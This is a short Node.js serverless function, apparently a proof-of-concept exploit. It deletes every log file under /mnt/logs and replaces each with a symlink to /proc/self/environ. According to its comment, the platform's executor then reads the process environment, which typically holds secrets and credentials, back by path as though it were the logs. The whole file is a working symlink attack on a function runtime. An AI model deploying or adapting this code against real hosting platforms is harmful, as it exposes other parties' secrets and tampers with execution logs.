const fs = require('fs');

// Replaces this execution's log files with symlinks to /proc/self/environ. The runtime keeps
// writing to the files it already opened, but the executor reads them by path afterwards.
module.exports = async (context) => {
    context.log('planted');

    for (const file of fs.readdirSync('/mnt/logs')) {
        fs.rmSync(`/mnt/logs/${file}`);
        fs.symlinkSync('/proc/self/environ', `/mnt/logs/${file}`);
    }

    return context.res.send('OK');
}
